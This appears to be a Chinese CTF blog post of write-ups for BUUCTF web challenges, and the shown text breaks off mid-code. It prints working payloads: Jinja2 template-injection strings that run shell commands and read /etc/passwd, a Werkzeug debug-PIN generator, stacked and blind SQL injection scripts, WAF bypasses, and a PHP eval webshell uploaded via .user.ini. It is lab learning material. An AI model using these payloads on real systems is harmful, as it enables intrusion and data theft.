title: BUUCTF刷题记录
author: bmth
tags:
  - 刷题笔记
  - CTF
categories: []
img: 'https://img-blog.csdnimg.cn/20210304211534316.png'
date: 2020-10-28 16:29:00
---
## [CSCCTF 2019 Qual]FlaskLight
查看源码发现有用的信息
![](/bmth_blog/images/pasted-162.png)
```python
{{2*2}}
```
![](/bmth_blog/images/pasted-163.png)
发现存在ssti，那么列出所有的类
```python
{{''.__class__.__mro__[2].__subclasses__()}}
```
写一个正则匹配的python脚本来查找有用的类序号
```python
import requests
import re
import html
import time

index = 0
for i in range(1, 300):
    try:
        url = "http://1c88f746-6344-4c02-b98b-0c6331405df3.node3.buuoj.cn/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}"
        r = requests.get(url)
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text)
        time.sleep(0.1)
        # print(res)
        # print(r.text)
        res = html.unescape(res[0])
        print(str(i) + " | " + res)
        #if "subprocess.Popen" in res:
            #index = i
            #break
    except:
        continue
#print("indexo of subprocess.Popen:" + str(index))
```
发现类`<class 'warnings.catch_warnings'>`，没有内置os模块在第59位。类`<class 'site._Printer'>` 内置os模块 在第71位，可以借助这些类来执行命令
由于使用`['__globals__']`会造成500的服务器错误信息，并且直接输入`?search=globals`时页面也会500，这里应该是被过滤了，所以这里采用了字符串拼接的形式`['__glo'+'bals__']`
```python
{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
```
![](/bmth_blog/images/pasted-164.png)
同理使用内置os模板的`site._Printer`
```python
{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
```
看了另一篇wp，发现类`subprocess.Popen`也可以使用，最后去读flag
```python
{{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```
![](/bmth_blog/images/pasted-165.png)


参考：
[刷题[CSCCTF 2019 Qual]FlaskLight](https://yanmymickey.github.io/2020/04/15/CTFwp/%5BCSCCTF%202019%20Qual%5DFlaskLight/)
[[CSCCTF 2019 Qual]FlaskLight](https://www.cnblogs.com/ersuani/p/13896200.html)
## [GYCTF2020]FlaskApp

看wp的同时学习一下知识点：
[从零学习flask模板注入](https://www.freebuf.com/column/187845.html)
[浅析SSTI(python沙盒绕过)](https://bbs.ichunqiu.com/thread-47685-1-1.html)
[Flask debug 模式 PIN 码生成机制安全性研究笔记](https://www.cnblogs.com/HacTF/p/8160076.html)

**hint:失败的意思就是，要让程序运行报错,报错后会暴露源码。**
base64decode在不会解析的时候就会报错
![](https://img-blog.csdnimg.cn/20200414124137347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

首先读源码：

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
```

![](https://img-blog.csdnimg.cn/20200414124708451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
传入，在解密处得到源码
![](https://img-blog.csdnimg.cn/2020041412475758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

```java
def waf(str):
    black_list = [&#34;flag&#34;,&#34;os&#34;,&#34;system&#34;,&#34;popen&#34;,&#34;import&#34;,&#34;eval&#34;,&#34;chr&#34;,&#34;request&#34;,
                  &#34;subprocess&#34;,&#34;commands&#34;,&#34;socket&#34;,&#34;hex&#34;,&#34;base64&#34;,&#34;*&#34;,&#34;?&#34;]
    for x in black_list :
        if x in str.lower() :
            return 1
```

**非预期：**
发现是flag和os等被过滤，师傅利用的字符串拼接
```python
{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}
```
![](https://img-blog.csdnimg.cn/20200414152340128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

```python
{{''.__class__.__base__.__subclasses__()[131].__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__("o'+'s").po'+'pen("cat /this_is_the_fl'+'ag.txt")').read()}}
```
或者
```python
{{''.__class__.__base__.__subclasses__()[77].__init__.__globals__['sys'].modules['o'+'s'].__dict__['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read()}}
```
读取flag
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
还可以使用切片省去了拼接flag的步骤
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}
```

![](https://img-blog.csdnimg.cn/20200414153616194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

**预期：**

这里借鉴一下师傅的文章：
要想生成PIN码，我们需要获得下面几个信息，所需要的信息均可以通过读文件来获得：
一：服务器运行flask所登录的用户名。通过读取/etc/password可知此值为:`flaskweb`
```python
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
```

![](https://img-blog.csdnimg.cn/20200414162943450.png)

二：modname的值。一般不变就是`flask.app`
三：`getattr(app, "__name__", app.__class__.__name__)`的结果。就是`Flask`，也不会变
四：flask库下app.py的绝对路径。在报错信息中可以获取此值为： `/usr/local/lib/python3.7/site-packages/flask/app.py`
五：当前网络的mac地址的十进制数。通过文件`/sys/class/net/eth0/address`读取，eth0为当前使用的网卡：

```python
{{{}.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()}}
```

![](https://img-blog.csdnimg.cn/20200414163652555.png)
![](https://img-blog.csdnimg.cn/20200414163922605.png)

六：机器的id:
>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件
对于docker机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id

我这里获取的是/proc/self/cgroup

```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup', 'r').read() }}{% endif %}{% endfor %}
```

![](https://img-blog.csdnimg.cn/20200414173017862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到`3a6ff5898390f421d3a796226e0e07c0339c79df1319cea55253e98e767c6118`

用kingkk师傅的exp：
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485410333015',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '3a6ff5898390f421d3a796226e0e07c0339c79df1319cea55253e98e767c6118'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

![](https://img-blog.csdnimg.cn/20200414173202993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

传入`265-149-843`直接进入python终端了

![](https://img-blog.csdnimg.cn/20200414173548546.png)
参考：
[[GYCTF2020]FlaskApp](https://www.cnblogs.com/h3zh1/p/12694933.html)
[GYCTF2020_Writeup](https://blog.csdn.net/qq_42181428/article/details/104474414)
[从一道ctf题谈谈flask开启debug模式存在的安全问题](https://www.anquanke.com/post/id/197602)

## [WesternCTF2018]shrine

SSTI模板注入，不会，查看wp。题目给出了源码：

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)
```

在shrine路径下测试ssti能正常执行

```java
/shrine/{{ 2+2 }}
```

![](https://img-blog.csdnimg.cn/20200318120225786.png)
由于有过滤，无法直接使用config
所以使用python的一些内置函数，比如url_for和get_flashed_messages

```java
/shrine/{{url_for.__globals__}}
```

![](https://img-blog.csdnimg.cn/20200318120629115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
current_app意思应该是当前app，那我们就当前app下的config：

```java
/shrine/{{url_for.__globals__['current_app'].config}}
```

![](https://img-blog.csdnimg.cn/20200318120810369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
还可以使用

```java
/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
```

![](https://img-blog.csdnimg.cn/20200318120946366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

参考：[[WesternCTF2018]shrine](https://www.cnblogs.com/wangtanzhi/p/12238779.html)


## [强网杯 2019]随便注

注意表的两端两边要加：反引号

`1' ; show databases;#`查看数据库
![](https://img-blog.csdnimg.cn/20200313215917182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

`1' ;show tables;#`查看表
![](https://img-blog.csdnimg.cn/20200313215744714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`0'; show columns from words ;#`查看words表中字段
![](https://img-blog.csdnimg.cn/20200313220222128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`0';show columns from 1919810931114514;#`
![](https://img-blog.csdnimg.cn/202003132213049.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现flag，然后看了师傅的文章发现：
1. 将words表改名为word1或其它任意名字

2. 1919810931114514改名为words

3. 将新的word表插入一列，列名为id

4. 将flag列改名为data

`1';rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#`

![](https://img-blog.csdnimg.cn/20200313222343545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后`1' or 1=1 #`得到flag
![](https://img-blog.csdnimg.cn/20200313222823998.png)
看了另一篇文章发现还可以用handler代替select查询
`1'; handler 1919810931114514 open as y1ng; handler y1ng read first; handler y1ng close;#`
![](https://img-blog.csdnimg.cn/20200313223508859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

## [护网杯 2018]easy_tornado

render是模板注入，由于不了解，看wp
![](https://img-blog.csdnimg.cn/20200313224125392.png)
**flag in /fllllllllllllag
render
md5(cookie_secret+md5(filename))**

```python
error?msg={{1*2}}
```
![](https://img-blog.csdnimg.cn/20200313224419149.png)
获取cookie_secret：`error?msg={{handler.settings}}`
![](https://img-blog.csdnimg.cn/20200313224529109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
根据获得的cookie_secret构造md5(cookie_secret+md5(filename))，python脚本如下：
```python
import hashlib
hash = hashlib.md5()

filename='/fllllllllllllag'
cookie_secret="2ad0f0aa-09ba-4658-b836-3f024bcb6702"
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())
```
运行得到`cdc288af8c27adc5ceea4581b0b94d46`
![](https://img-blog.csdnimg.cn/20200313224939932.png)
`file?filename=/fllllllllllllag&filehash=cdc288af8c27adc5ceea4581b0b94d46`得到flag
![](https://img-blog.csdnimg.cn/20200313225128999.png)
##  [SUCTF 2019]EasySQL
不会。。。查看wp的时候得到了源码：
```php
<?php
    session_start();

    include_once "config.php";

    $post = array();
    $get = array();
    global $MysqlLink;

    //GetPara();
    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);
    if(!$MysqlLink){
        die("Mysql Connect Error!");
    }
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB){
        die("Choose Database Error!");
    }

    foreach ($_POST as $k=>$v){
        if(!empty($v)&&is_string($v)){
            $post[$k] = trim(addslashes($v));
        }
    }
    foreach ($_GET as $k=>$v){
        }
    }
    //die();
    ?>

<html>
<head>
</head>

<body>

<a> Give me your flag, I will tell you if the flag is right. </ a>
<form action="" method="post">
<input type="text" name="query">
<input type="submit">
</form>
</body>
</html>

<?php

    if(isset($post['query'])){
        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|\"";
        //var_dump(preg_match("/{$BlackList}/is",$post['query']));
        if(preg_match("/{$BlackList}/is",$post['query'])){
            //echo $post['query'];
            die("Nonono.");
        }
        if(strlen($post['query'])>40){
            die("Too long.");
        }
        $sql = "select ".$post['query']."||flag from Flag";
        mysqli_multi_query($MysqlLink,$sql);
        do{
            if($res = mysqli_store_result($MysqlLink)){
                while($row = mysqli_fetch_row($res)){
                    print_r($row);
                }
            }
        }while(@mysqli_next_result($MysqlLink));

    }

    ?>
```
预期：`1;set sql_mode=pipes_as_concat;select 1`
pipes_as_concat：将“||”视为字符串的连接操作符而非或运算符，将前一个字段的查询结果和后一个字段查询结果进行拼接
![](https://img-blog.csdnimg.cn/20200314103931574.png)
非预期：`*,1`
*号为查询所有数据
![](https://img-blog.csdnimg.cn/20200314104156861.png)

## [HCTF 2018]admin

直接给链接看了，师傅tql：[HCTF2018-admin](https://www.jianshu.com/p/f92311564ad0)
不知道是否可以爆破(没试)。。。。账号：admin，密码：123即可登录得到flag
![](https://img-blog.csdnimg.cn/20200314110918647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
下面这种情况字符串无论进行多少次lower()都会得到一个结果,因此lower()方法具有幂等性
![](https://img-blog.csdnimg.cn/20200314111751343.png)
注册一个ᴬᴰmin账号，传入的数据会进行一次转化,这时ᴬᴰmin-->ADmin,服务器端会判断该用户是否存在,然后成功注册
![](https://img-blog.csdnimg.cn/20200314112955671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
账号成功登录，并且变为ADmin
![](https://img-blog.csdnimg.cn/20200314113136218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后再更改密码，用admin和自己更改的密码登录，得到flag
![](https://img-blog.csdnimg.cn/20200314113324737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [RoarCTF 2019]Easy Calc
假如waf不允许num变量传递字母：
`http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话`
那么我们可以在num前加个空格：
`http://www.xxx.com/index.php? num = aaaa`
这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。

在calc.php得到源码
![](https://img-blog.csdnimg.cn/20200314114323822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
用`? num`可绕过waf检测,并执行了php语句
![](https://img-blog.csdnimg.cn/20200314115540936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
接下来要查看目录文件
![](https://img-blog.csdnimg.cn/20200314114954676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
构造`? num=1;var_dump(scandir(chr(47)))`char(47)是 / 的ascii码，也可以用`hex2bin(dechex(47))`
![](https://img-blog.csdnimg.cn/20200314115818726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到了f1agg，我们查看文件即可
![](https://img-blog.csdnimg.cn/202003141201118.png)
构造 `? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`
![](https://img-blog.csdnimg.cn/20200314120225868.png)

可参考文章：[利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359.html)

## [强网杯 2019]高明的黑客
先下载源码，然后看师傅的wp
![](https://img-blog.csdnimg.cn/20200314140807296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
下载源码，打开是几千个php文件，而且很乱，根本没法看，不过里面包含很多shell，那么我们就要找到有用的shell。
利用师傅脚本得到有用的shell即可，

[强网杯upload&&高明的黑客&&随便注 复现](https://www.cnblogs.com/BOHB-yunying/p/11555858.html)

## [SUCTF 2019]CheckIn
### 方法一：正常文件上传
上传php文件返回：非法后缀
![](https://img-blog.csdnimg.cn/20200314142731740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
上传.htaccess返回exif_imagetype:not image
![](https://img-blog.csdnimg.cn/20200314142857215.png)
上传xxx.jpg返回<? in contents!
![](https://img-blog.csdnimg.cn/20200314143021170.png)
接下来是我的上传误区！！！
把一句话改为如下进行上传，成功过滤<?
`GIF89a`
`<script language="php">@eval($_POST['pass']);</script>`
![](https://img-blog.csdnimg.cn/20200314144324648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么试着改文件类型将.htaccess上传
![](https://img-blog.csdnimg.cn/20200314144204606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
上传都成功了，试着访问发现：失败。查看wp发现：htaccess有局限性，只能是apache
这里有新的知识点：
.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。

**可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。在.user.ini写入代码如下，上传**
```javascript
GIF89a
auto_prepend_file=a.jpg
```
这里注意由于upload/文件夹下有index.php，会包含a.jpg，所以成功了
![](https://img-blog.csdnimg.cn/20200314150824850.png)
接下来蚁剑连接即可得到flag
![](https://img-blog.csdnimg.cn/20200314151020368.png)
### 方法二：直接执行命令查看flag
假若一句话木马被禁了，那么我们还可以命令执行得到flag
`GIF89a`
`<script language="php">var_dump(scandir("/"));</script>`
![](https://img-blog.csdnimg.cn/20200314152738446.png)
在根目录发现flag，将执行语句改为
`<script language="php">var_dump(file_get_contents("/flag"));</script>`
或
`<script language="php">system("cat /flag");</script>`
![](https://img-blog.csdnimg.cn/20200314153703673.png)
不好的地方就是要重复上传a.jpg可能会出现问题
参考：[[SUCTF 2019]CheckIn](https://www.cnblogs.com/wangtanzhi/p/11862682.html)

## [极客大挑战 2019]EasySQL
送分？？？？？？？构造万能密码登录，成功得到flag
`admin' or 1=1#`
![](https://img-blog.csdnimg.cn/20200315112904981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
![](https://img-blog.csdnimg.cn/20200315113016754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [CISCN2019 华北赛区 Day2 Web1]Hack World
![](https://img-blog.csdnimg.cn/20200315120658691.png)
sql注入的题目，有过滤，然后发现过滤了`union、and、or、空格`和`/**/`，无从下手，查看了wp，发现空格其实还有很多解法的
空格可以用：`%09 %0a %0b %0c %0d /**/ /*!*/`或者直接tab
这里用模糊测试得出
![](https://img-blog.csdnimg.cn/20200315120329691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
![](https://img-blog.csdnimg.cn/20200315120342589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
mid，substr都没被过滤，考虑布尔盲注，用if函数判断截取出来的内容是什么，这里需要穷举。如果判断成功，返回1，否则返回2。由于题目告诉我们表和字段都为flag，可直接爆破flag的值
参考师傅的二分法脚本如下：
```python
import requests
import time
#url是随时更新的，具体的以做题时候的为准
url = 'http://7558e160-ede8-4f30-a7da-6b5727376b56.node3.buuoj.cn/index.php'
data = {"id":""}
flag = 'flag{'

i = 6
while True:
#从可打印字符开始
    begin = 32
    end = 126
    tmp = (begin+end)//2
    while begin<end:
        print(begin,tmp,end)
        time.sleep(1)
        data["id"] = "if(ascii(substr((select	flag	from	flag),{},1))>{},1,2)".format(i,tmp)
        r = requests.post(url,data=data)
        if 'Hello' in r.text:
            begin = tmp+1
            tmp = (begin+end)//2
        else:
            end = tmp
            tmp = (begin+end)//2

    flag+=chr(tmp)
    print(flag)
    i+=1
    if flag[-1]=='}':
        break
```
这里buuctf限制每秒访问次数，所以加上time.sleep(1)。等了几分钟得到flag了
![](https://img-blog.csdnimg.cn/20200315143821741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
这里可以看一下源码，看看到底过滤了哪些
```php
<?php
$dbuser='root';
$dbpass='root';

function safe($sql){
    #被过滤的内容 函数基本没过滤
    $blackList = array(' ','||','#','-',';','&','+','or','and','`','"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./');
    foreach($blackList as $blackitem){
        if(stripos($sql,$blackitem)){
            return False;
        }
    }
    return True;
}
if(isset($_POST['id'])){
    $id = $_POST['id'];
}else{
    die();
}
$db = mysql_connect("localhost",$dbuser,$dbpass);
if(!$db){
    die(mysql_error());
}   
mysql_select_db("ctf",$db);

if(safe($id)){
    $query = mysql_query("SELECT content from passage WHERE id = ${id} limit 0,1");
    
    if($query){
        $result = mysql_fetch_array($query);
        
        if($result){
            echo $result['content'];
        }else{
            echo "Error Occured When Fetch Result.";
        }
    }else{
        var_dump($query);
    }
}else{
    die("SQL Injection Checked.");
}
```

## [极客大挑战 2019]Havefun
查看源码得到了
![](https://img-blog.csdnimg.cn/20200315144647759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
    $cat=$_GET['cat'];
    echo $cat;
    if($cat=='dog'){
          echo 'Syc{cat_cat_cat_cat}';
        }
        
```
用`Syc{cat_cat_cat_cat}`提交发现不对，试着传`?cat=dog`，就得到了flag.....送分题
![](https://img-blog.csdnimg.cn/20200315145055945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [极客大挑战 2019]Secret File
进去发现查看源码得到信息
![](https://img-blog.csdnimg.cn/20200315145715369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
接着就是访问
![](https://img-blog.csdnimg.cn/20200315145748826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
点击发现
![](https://img-blog.csdnimg.cn/20200315145814774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
回复没看清么，那么抓包试试
![](https://img-blog.csdnimg.cn/20200315150101402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问得到一段源码，是文件包含，并且提示flag在flag.php里面
![](https://img-blog.csdnimg.cn/20200315150210765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
直接访问`?file=flag.php`发现不行，用`?file=php://filter/read=convert.base64-encode/resource=flag.php`访问得到base64编码的源码，解码即可
![](https://img-blog.csdnimg.cn/20200315150823737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
~~为什么我觉得蒋璐源是女生。。。。~~

## [网鼎杯 2018]Fakebook
进入发现一个登陆，一个注册，然后试了试没有思路，看wp
![](https://img-blog.csdnimg.cn/20200315151322567.png)
发现有flag.php和robots.txt，访问robots.txt可以得到user.php.bak，查看得到代码

```php
<?php

class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

